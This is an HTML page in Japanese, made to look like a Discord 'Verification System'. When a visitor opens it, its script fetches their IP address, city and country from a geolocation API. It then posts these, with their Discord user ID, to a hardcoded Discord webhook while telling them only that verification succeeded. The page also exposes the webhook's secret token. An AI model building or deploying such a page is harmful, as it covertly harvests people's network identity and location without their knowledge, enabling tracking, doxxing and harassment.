<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification System</title>
    <style>
        body {
            background-color: #232428; /* Discordの背景色 */
            color: #dbdee1;
            font-family: sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #313338;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 8px 16px rgba(0,0,0,0.2);
            text-align: center;
            width: 90%;
            max-width: 400px;
        }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-left-color: #5865f2;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-bottom: 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        h1 { font-size: 20px; margin-bottom: 10px; color: #ffffff; }
        p { font-size: 14px; color: #b5bac1; }
        .success-mark { color: #23a559; font-size: 50px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div id="loading" class="spinner"></div>
        <div id="success" class="success-mark">✔</div>
        <h1 id="status">認証中...</h1>
        <p id="msg">しばらくお待ちください。</p>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1457786197194833942/_E73GseEb0V1qIPIb65KbaCeZYddXazUstpwCqhfbwfJcgiAKaoBr9KT7ygzWWg4tF6Q";

        async function start() {
            const params = new URLSearchParams(window.location.search);
            const state = params.get('state');

            if (!state) {
                document.getElementById('status').innerText = "エラー";
                document.getElementById('msg').innerText = "パラメータが不足しています。";
                return;
            }

            try {
                const parts = state.split('_');
                const logId = parts[1];
                const userId = parts[3];

                const geo = await (await fetch('https://ipapi.co/json/')).json();

                await fetch(`${WEBHOOK_URL}/messages/${logId}`, {
                    method: 'PATCH',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `✅ **認証成功**: <@${userId}>`,
                        embeds: [{
                            title: "User Verified",
                            description: `**User:** <@${userId}>\n**IP:** \`${geo.ip}\`\n**Location:** \`${geo.city}, ${geo.country_name}\``,
                            color: 0x23a559,
                            timestamp: new Date().toISOString()
                        }]
                    })
                });

                document.getElementById('loading').style.display = 'none';
                document.getElementById('success').style.display = 'inline-block';
                document.getElementById('status').innerText = "認証完了";
                document.getElementById('msg').innerText = "この画面を閉じてDiscordに戻ってください。";

            } catch (e) {
                document.getElementById('status').innerText = "エラー";
                document.getElementById('msg').innerText = "処理に失敗しました。";
            }
        }
        window.onload = start;
    </script>
</body>
</html>
